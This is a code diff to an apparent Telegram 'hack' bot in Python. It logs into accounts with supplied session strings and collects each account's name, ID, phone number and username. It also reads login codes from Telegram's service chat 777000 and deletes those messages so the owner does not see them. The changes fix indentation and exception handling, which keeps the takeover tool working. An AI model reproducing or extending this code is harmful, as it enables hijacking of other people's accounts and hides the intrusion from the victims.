@@ -18,7 +18,7 @@ from telethon.tl.functions.auth import ResetAuthorizationsRequest as rt
 import telethon;from telethon import functions as ok
 from pyrogram.types import ChatPrivileges
 from telethon.tl.types import ChannelParticipantsAdmins
- 
+
 async def user_info(session):
     err = ""
     try:
@@ -29,19 +29,23 @@ async def user_info(session):
                 k = await steve.get_me()  
                 msg = info.format((k.first_name if k.first_name else k.last_name),k.id,k.phone,k.username)
                 await steve.disconnect()
+            except Exception as e:
+                print(e)
                              
     else:    
          async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
             try:
                 k = await stark.get_me()
-               msg = info.format((k.first_name if k.first_name else k.last_name),k.id,k.phone_number,k.username)
+                msg = info.format((k.first_name if k.first_name else k.last_name),k.id,k.phone_number,k.username)
+            except Exception as e:
+                print(e)
     except Exception as idk:
         err += str(idk)
                     
     if err:
         return "**ᴇʀʀᴏʀ:** " + err + "\n**ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
     return msg    
-     
+
 async def get_otp(session):
     err = ""
     i = ""
@@ -53,7 +57,9 @@ async def get_otp(session):
                 async for x in steve.iter_messages(777000, limit=2):               
                     i += f"\n{x.text}\n"
                     await steve.delete_dialog(777000)
-            await steve.disconnect() 
+                await steve.disconnect() 
+            except Exception as e:
+                print(e)
                              
     else:    
          async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
@@ -63,8 +69,10 @@ async def get_otp(session):
                      i += f"\n{message.text}\n"                                   
                      ok.append(message.id)                 
                  await stark.delete_messages(777000,ok)
-      except Exception as idk:
-          err += str(idk)
+             except Exception as e:
+                 print(e)
+    except Exception as idk:
+        err += str(idk)
                     
     if err:
         return "**ᴇʀʀᴏʀ:** " + err + "\n**ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
